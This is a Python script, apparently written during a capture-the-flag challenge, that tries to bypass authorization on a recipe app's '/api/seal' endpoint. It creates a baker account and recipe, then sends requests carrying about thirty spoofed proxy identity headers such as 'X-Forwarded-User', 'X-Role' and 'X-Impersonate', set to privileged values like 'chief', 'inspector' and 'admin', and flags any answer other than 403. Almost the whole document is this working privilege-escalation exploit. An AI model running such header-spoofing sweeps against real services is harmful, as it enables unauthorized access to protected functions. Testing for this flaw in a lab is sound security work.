#!/usr/bin/env python3
"""Trust-a-header identity: the one auth bypass nobody in either session enumerated.

`/api/seal` answers `403 inspector authorization required` for us, which is an
*authorization* decision made on an identity the request supplies. We assumed the only
supplier is the HttpOnly session cookie, and we spoofed X-Forwarded-For / Real-IP /
Authorization once - but proxy-injected **identity** headers are a different class and a
very common one: Kong, APISIX, Google IAP, Traefik forward-auth and home-grown nginx
`auth_request` setups all hand the application `X-Forwarded-User` / `X-Remote-User` /
`X-Auth-User` style headers *as the authenticated principal*. If this app reads any of
them for the staff check, it is a two-request solve, which is what "~100 teams solved it
early" actually looks like.

Oracle is deliberately unambiguous: a REAL recipe we own is passed as recipeId, so a baker
gets 403, a staff-but-not-chief caller gets 200 with `seal:"reviewed"`, and a chief caller
gets 200 with `seal:"chief"` (plus the flag in the page). Anything that is not 403 is news.
"""
import re
import sys
sys.path.insert(0, '.')
import time
from cc import new_baker

HDRS = ["X-Forwarded-User", "X-Forwarded-Username", "X-Forwarded-Role", "X-Remote-User",
        "X-Authenticated-User", "X-Auth-User", "X-Authed-User", "X-User", "X-Username",
        "X-Login", "X-Role", "X-User-Role", "X-Roles", "X-Group", "X-Staff", "X-Inspector",
        "X-Bot", "X-Worker", "X-Real-User", "X-CookieCorp-User", "X-CookieCorp-Role",
        "X-Inspector-Key", "X-Seal-Authority", "X-Golden", "X-Power-User", "X-Effective-User",
        "X-Nginx-User", "X-Authrequest-User", "X-Original-URL", "X-Rewrite-URL",
        "X-Forwarded-Prefer", "X-Impersonate", "X-Act-As-User", "X-Debug-User"]
VALUES = ["chief", "inspector", "robot", "cookiecorp", "admin"]


def w(*a):
    sys.stdout.buffer.write((" ".join(str(x) for x in a) + "\n").encode("utf-8", "replace"))
    sys.stdout.flush()


u, c, _ = new_baker("ih")
code, out, dt = c.post("/api/recipe", {"title": "header oracle",
                                       "ingredients": [{"name": "flour", "value": "1"}]})
rid = out["id"]
w("user %s  recipe %s" % (u, rid))
code, o, dt = c.post("/api/seal", {"recipeId": rid})
w("control (no extra headers) -> %s %s" % (code, str(o)[:60]))
code, o, dt = c.post("/api/seal", {"recipeId": rid}, headers={"X-Role": "chief"})
w("control positive-ish X-Role -> %s %s" % (code, str(o)[:60]))

hits = []
for h in HDRS:
    for v in VALUES[:2]:
        code, o, dt = c.post("/api/seal", {"recipeId": rid}, headers={h: v})
        if code != 403:
            w("  !!! %-24s %s -> %s %s" % (h, v, code, str(o)[:90]))
            hits.append((h, v))
        time.sleep(0.1)
w("headers tried: %d x %d, non-403 answers: %d" % (len(HDRS), 2, len(hits)))
if hits:
    for h, v in hits:
        code, o, dt = c.post("/api/seal", {"recipeId": rid}, headers={h: "chief"})
        w("  recheck %s=chief -> %s %s" % (h, code, str(o)[:120]))
